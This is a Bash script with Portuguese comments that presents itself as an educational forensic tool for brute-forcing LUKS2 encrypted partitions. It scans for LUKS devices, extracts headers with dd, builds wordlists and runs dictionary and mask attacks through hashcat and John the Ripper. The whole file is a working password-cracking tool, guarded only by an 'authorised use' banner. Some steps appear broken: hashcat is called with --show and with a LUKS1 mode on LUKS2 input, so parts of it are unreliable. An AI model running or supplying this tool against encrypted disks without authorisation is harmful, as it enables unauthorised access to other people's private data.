#!/bin/bash
# luks_bruteforce_attack.sh - Script para ataque de força bruta LUKS2
# Baseado na análise forense de viabilidade de ataques
# 
# ⚠️  AVISO LEGAL: Use apenas em sistemas próprios ou com autorização
# ⚠️  Este script é para fins educacionais e de pesquisa de segurança

set -euo pipefail

# Configurações
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="$SCRIPT_DIR/luks_attack_$(date +%Y%m%d_%H%M%S).log"
WORK_DIR="/tmp/luks_attack_$$"

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Funções utilitárias
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

error() {
    log "${RED}[ERROR]${NC} $1"
}

success() {
    log "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    log "${YELLOW}[WARNING]${NC} $1"
}

info() {
    log "${BLUE}[INFO]${NC} $1"
}

banner() {
    echo -e "${GREEN}"
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════════╗
║                    LUKS2 Bruteforce Attack Tool                 ║
║                  Análise Forense de Viabilidade                 ║
╠══════════════════════════════════════════════════════════════════╣
║  ⚠️  APENAS para sistemas próprios ou com autorização escrita    ║
║  ⚠️  Uso educacional e pesquisa de segurança                     ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Verificar dependências
check_dependencies() {
    info "Verificando dependências..."
    
    local deps=("cryptsetup" "dd" "file" "python3")
    local optional=("hashcat" "john" "crunch")
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            error "Dependência obrigatória não encontrada: $dep"
            return 1
        fi
    done
    
    for opt in "${optional[@]}"; do
        if command -v "$opt" &> /dev/null; then
            success "Ferramenta opcional encontrada: $opt"
        else
            warning "Ferramenta opcional não encontrada: $opt"
        fi
    done
    
    success "Verificação de dependências concluída"
}

# Fase 1: Reconhecimento do alvo
reconnaissance() {
    info "=== FASE 1: RECONHECIMENTO ==="
    
    info "Listando dispositivos de bloco disponíveis:"
    lsblk -f | tee -a "$LOG_FILE"
    
    echo
    info "Dispositivos com partições LUKS:"
    blkid | grep -i luks | tee -a "$LOG_FILE" || warning "Nenhuma partição LUKS encontrada"
    
    echo
    info "Informações detalhadas de disco:"
    fdisk -l 2>/dev/null | grep -E "Disk /|/dev/|LUKS" | head -20 | tee -a "$LOG_FILE"
}

# Extração do cabeçalho LUKS
extract_luks_header() {
    local device="$1"
    local output_file="$2"
    
    info "=== FASE 2: EXTRAÇÃO DO CABEÇALHO LUKS ==="
    
    if [[ ! -b "$device" ]]; then
        error "Dispositivo não encontrado: $device"
        return 1
    fi
    
    # Verificar se é LUKS
    if ! cryptsetup isLuks "$device"; then
        error "Dispositivo não é LUKS: $device"
        return 1
    fi
    
    info "Extraindo cabeçalho LUKS de $device..."
    
    # Método 1: dd - mais completo para cracking
    info "Extraindo com dd (recomendado para cracking)..."
    dd if="$device" of="$output_file.raw" bs=512 count=4097 2>/dev/null
    success "Cabeçalho extraído: $output_file.raw ($(du -h "$output_file.raw" | cut -f1))"
    
    # Método 2: cryptsetup luksHeaderBackup - backup oficial
    info "Criando backup oficial do cabeçalho..."
    cryptsetup luksHeaderBackup "$device" --header-backup-file "$output_file.backup"
    success "Backup oficial criado: $output_file.backup"
    
    # Análise do cabeçalho
    info "Analisando configuração LUKS..."
    cryptsetup luksDump "$device" | tee -a "$LOG_FILE"
    
    # Identificar KDF
    local kdf=$(cryptsetup luksDump "$device" | grep -A5 "PBKDF" | grep "Algorithm" | head -1)
    if echo "$kdf" | grep -qi "argon2"; then
        warning "KDF detectada: Argon2 (Alta resistência - ataque pode ser inviável)"
    elif echo "$kdf" | grep -qi "pbkdf2"; then
        info "KDF detectada: PBKDF2 (Menor resistência - ataque mais viável)"
    else
        warning "KDF não identificada claramente"
    fi
}

# Preparação do hash para cracking
prepare_hash() {
    local header_file="$1"
    local hash_output="$2"
    
    info "=== FASE 3: PREPARAÇÃO DO HASH ==="
    
    # Verificar se existe luks2john ou similar
    local luks2john_script=""
    
    # Procurar luks2john em locais comuns
    for path in "/usr/share/john/luks2john.py" "/opt/john/run/luks2john.py" "./luks2john.py"; do
        if [[ -f "$path" ]]; then
            luks2john_script="$path"
            break
        fi
    done
    
    if [[ -n "$luks2john_script" ]]; then
        info "Convertendo cabeçalho para formato crackeable com luks2john..."
        python3 "$luks2john_script" "$header_file" > "$hash_output" 2>/dev/null
        success "Hash preparado: $hash_output"
    else
        warning "luks2john não encontrado. Tentando método alternativo..."
        
        # Método alternativo: usar o próprio arquivo raw
        cp "$header_file" "$hash_output"
        info "Usando arquivo raw diretamente: $hash_output"
    fi
    
    # Verificar conteúdo do hash
    info "Verificando formato do hash extraído:"
    file "$hash_output" | tee -a "$LOG_FILE"
    
    if [[ -s "$hash_output" ]]; then
        success "Hash pronto para ataque ($(du -h "$hash_output" | cut -f1))"
        return 0
    else
        error "Falha na preparação do hash"
        return 1
    fi
}

# Geração de wordlists
generate_wordlists() {
    local output_dir="$1"
    
    info "=== GERAÇÃO DE WORDLISTS ==="
    
    mkdir -p "$output_dir"
    
    # Wordlist simples com crunch (se disponível)
    if command -v crunch &> /dev/null; then
        info "Gerando wordlist numérica simples (4-8 dígitos)..."
        crunch 4 8 0123456789 -o "$output_dir/numeric.txt" 2>/dev/null || true
        
        info "Gerando wordlist alfanumérica curta (4-6 chars)..."
        crunch 4 6 abcdefghijklmnopqrstuvwxyz0123456789 -o "$output_dir/alpha_short.txt" 2>/dev/null || true
        
        # Padrões comuns
        info "Gerando padrões comuns (Admin + números)..."
        crunch 9 9 -t Admin%%%% -o "$output_dir/admin_pattern.txt" 2>/dev/null || true
    else
        warning "crunch não encontrado, pulando geração de wordlists personalizadas"
    fi
    
    # Wordlist de senhas comuns (se não existir)
    if [[ ! -f "$output_dir/common.txt" ]]; then
        info "Criando wordlist de senhas comuns..."
        cat > "$output_dir/common.txt" << 'EOF'
123456
password
123456789
qwerty
abc123
Password1
admin
root
user
test
guest
1234
12345
123123
password123
admin123
letmein
welcome
monkey
dragon
EOF
    fi
    
    success "Wordlists preparadas em: $output_dir"
}

# Ataque com Hashcat
attack_hashcat() {
    local hash_file="$1"
    local wordlist_dir="$2"
    local results_file="$3"
    
    if ! command -v hashcat &> /dev/null; then
        warning "Hashcat não encontrado, pulando ataques GPU"
        return 1
    fi
    
    info "=== ATAQUE COM HASHCAT ==="
    
    # Detectar modo correto
    local hash_mode="14600"  # LUKS1 padrão
    
    # Verificar se é LUKS2 e tentar determinar modo
    if file "$hash_file" | grep -qi "luks2\|json"; then
        warning "Detectado LUKS2 - pode requerer modo específico"
        # Hashcat mais recente pode ter modo específico para LUKS2
    fi
    
    info "Executando benchmark para estimar performance..."
    timeout 30 hashcat -b -m "$hash_mode" 2>/dev/null | tee -a "$LOG_FILE" || true
    
    # Ataque 1: Wordlist de senhas comuns
    if [[ -f "$wordlist_dir/common.txt" ]]; then
        info "Executando ataque de dicionário (senhas comuns)..."
        timeout 300 hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist_dir/common.txt" \
            --outfile "$results_file" --show 2>/dev/null || true
        
        # Verificar resultado
        if [[ -s "$results_file" ]]; then
            success "SENHA ENCONTRADA!"
            cat "$results_file" | tee -a "$LOG_FILE"
            return 0
        fi
    fi
    
    # Ataque 2: Wordlist numérica (se pequena)
    if [[ -f "$wordlist_dir/numeric.txt" ]] && [[ $(wc -l < "$wordlist_dir/numeric.txt") -lt 100000 ]]; then
        info "Executando ataque numérico..."
        timeout 600 hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist_dir/numeric.txt" \
            --outfile "$results_file" --show 2>/dev/null || true
            
        if [[ -s "$results_file" ]]; then
            success "SENHA ENCONTRADA!"
            cat "$results_file" | tee -a "$LOG_FILE"
            return 0
        fi
    fi
    
    # Ataque 3: Máscara simples (apenas para demonstração - limitado)
    info "Executando ataque de máscara limitado (4 dígitos)..."
    timeout 120 hashcat -m "$hash_mode" -a 3 "$hash_file" "?d?d?d?d" \
        --outfile "$results_file" --show 2>/dev/null || true
        
    if [[ -s "$results_file" ]]; then
        success "SENHA ENCONTRADA!"
        cat "$results_file" | tee -a "$LOG_FILE"
        return 0
    fi
    
    warning "Nenhuma senha encontrada com Hashcat nos testes limitados"
    return 1
}

# Ataque com John the Ripper
attack_john() {
    local hash_file="$1"
    local wordlist_dir="$2"
    local results_file="$3"
    
    if ! command -v john &> /dev/null; then
        warning "John the Ripper não encontrado, pulando ataques CPU"
        return 1
    fi
    
    info "=== ATAQUE COM JOHN THE RIPPER ==="
    
    # Verificar formatos suportados
    info "Verificando formatos LUKS suportados..."
    john --list=formats | grep -i luks | tee -a "$LOG_FILE" || warning "Formatos LUKS não listados"
    
    # Detectar dispositivos OpenCL (se disponível)
    info "Verificando dispositivos OpenCL..."
    john --list=opencl-devices 2>/dev/null | tee -a "$LOG_FILE" || info "OpenCL não disponível"
    
    # Tentar diferentes formatos LUKS
    local formats=("LUKS" "luks" "LUKS2-opencl" "luks2-opencl")
    
    for format in "${formats[@]}"; do
        info "Tentando formato: $format"
        
        # Ataque com wordlist comum
        if [[ -f "$wordlist_dir/common.txt" ]]; then
            timeout 300 john --format="$format" --wordlist="$wordlist_dir/common.txt" "$hash_file" 2>/dev/null || true
        fi
        
        # Verificar se encontrou senha
        john --show --format="$format" "$hash_file" 2>/dev/null > "$results_file.tmp" || true
        
        if [[ -s "$results_file.tmp" ]] && grep -q ":" "$results_file.tmp"; then
            success "SENHA ENCONTRADA com John the Ripper!"
            cat "$results_file.tmp" | tee -a "$LOG_FILE"
            mv "$results_file.tmp" "$results_file"
            return 0
        fi
        
        rm -f "$results_file.tmp"
    done
    
    warning "Nenhuma senha encontrada com John the Ripper"
    return 1
}

# Análise de resultados
analyze_results() {
    local device="$1"
    local results_file="$2"
    
    info "=== ANÁLISE DE RESULTADOS ==="
    
    if [[ -s "$results_file" ]]; then
        success "ATAQUE BEM-SUCEDIDO!"
        info "Senha encontrada para $device:"
        cat "$results_file" | tee -a "$LOG_FILE"
        
        warning "IMPORTANTE: Documento este resultado para o relatório de auditoria"
        warning "Esta descoberta indica configuração de segurança inadequada"
    else
        info "Nenhuma senha encontrada nos ataques realizados"
        info "Isso pode indicar:"
        echo "  - Configuração segura (Argon2id com parâmetros adequados)"
        echo "  - Senha de alta entropia (>12 caracteres aleatórios)"
        echo "  - Necessidade de wordlists mais extensas"
        echo "  - Necessidade de mais poder computacional/tempo"
    fi
    
    # Estimativa de custo/tempo para ataques mais extensivos
    info "Estimativas para ataques extensivos:"
    
    local kdf_info=$(cryptsetup luksDump "$device" | grep -A10 "PBKDF")
    
    if echo "$kdf_info" | grep -qi "argon2"; then
        warning "KDF Argon2 detectada:"
        echo "  - Ataque de força bruta completo: ECONOMICAMENTE INVIÁVEL"
        echo "  - Custo estimado para 12 chars: >1 bilhão USD"
        echo "  - Recomendação: Focar em ataques de dicionário otimizados"
    elif echo "$kdf_info" | grep -qi "pbkdf2"; then
        info "KDF PBKDF2 detectada:"
        echo "  - Ataque mais viável com recursos GPU significativos"
        echo "  - Custo estimado: 10K-100K USD para senhas médias"
        echo "  - Recomendação: Migrar para Argon2id imediatamente"
    fi
}

# Limpeza
cleanup() {
    info "Limpando arquivos temporários..."
    rm -rf "$WORK_DIR" 2>/dev/null || true
    success "Limpeza concluída"
}

# Menu principal
show_usage() {
    echo "Uso: $0 [OPÇÕES] DISPOSITIVO"
    echo ""
    echo "OPÇÕES:"
    echo "  -h, --help          Mostrar esta ajuda"
    echo "  -o, --output DIR    Diretório de saída (padrão: ./luks_attack_results)"
    echo "  -w, --wordlist DIR  Diretório de wordlists customizadas"
    echo "  -t, --time SECONDS  Timeout para cada tipo de ataque (padrão: 300)"
    echo ""
    echo "EXEMPLO:"
    echo "  $0 /dev/sdb2"
    echo "  $0 -o /tmp/results -w /custom/wordlists /dev/nvme0n1p3"
    echo ""
    echo "DISPOSITIVO deve ser uma partição LUKS válida"
}

# Função principal
main() {
    local device=""
    local output_dir="./luks_attack_results_$(date +%Y%m%d_%H%M%S)"
    local wordlist_dir=""
    local attack_timeout=300
    
    # Parsing de argumentos
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_usage
                exit 0
                ;;
            -o|--output)
                output_dir="$2"
                shift 2
                ;;
            -w|--wordlist)
                wordlist_dir="$2"
                shift 2
                ;;
            -t|--time)
                attack_timeout="$2"
                shift 2
                ;;
            -*)
                error "Opção desconhecida: $1"
                show_usage
                exit 1
                ;;
            *)
                if [[ -z "$device" ]]; then
                    device="$1"
                else
                    error "Múltiplos dispositivos especificados"
                    show_usage
                    exit 1
                fi
                shift
                ;;
        esac
    done
    
    # Verificar argumentos obrigatórios
    if [[ -z "$device" ]]; then
        error "Dispositivo não especificado"
        show_usage
        exit 1
    fi
    
    # Verificar permissões
    if [[ $EUID -ne 0 ]]; then
        error "Este script requer privilégios de root (sudo)"
        exit 1
    fi
    
    banner
    
    # Criar diretórios de trabalho
    mkdir -p "$output_dir"
    mkdir -p "$WORK_DIR"
    
    info "Iniciando análise de ataque LUKS em: $device"
    info "Diretório de saída: $output_dir"
    info "Log detalhado: $LOG_FILE"
    
    # Verificar dependências
    check_dependencies || exit 1
    
    # Fase 1: Reconhecimento
    reconnaissance
    
    # Fase 2: Extração
    local header_base="$output_dir/luks_header"
    extract_luks_header "$device" "$header_base" || exit 1
    
    # Fase 3: Preparação do hash
    local hash_file="$output_dir/luks_hash.txt"
    prepare_hash "$header_base.raw" "$hash_file" || exit 1
    
    # Geração/preparação de wordlists
    if [[ -z "$wordlist_dir" ]]; then
        wordlist_dir="$output_dir/wordlists"
        generate_wordlists "$wordlist_dir"
    fi
    
    # Ataques
    local results_file="$output_dir/password_found.txt"
    
    # Tentar Hashcat primeiro (GPU)
    attack_hashcat "$hash_file" "$wordlist_dir" "$results_file" || \
    # Se falhar, tentar John the Ripper (CPU)
    attack_john "$hash_file" "$wordlist_dir" "$results_file"
    
    # Análise final
    analyze_results "$device" "$results_file"
    
    # Limpeza
    cleanup
    
    success "Análise concluída. Verifique: $output_dir"
}

# Trap para limpeza em caso de interrupção
trap cleanup EXIT

# Executar apenas se chamado diretamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi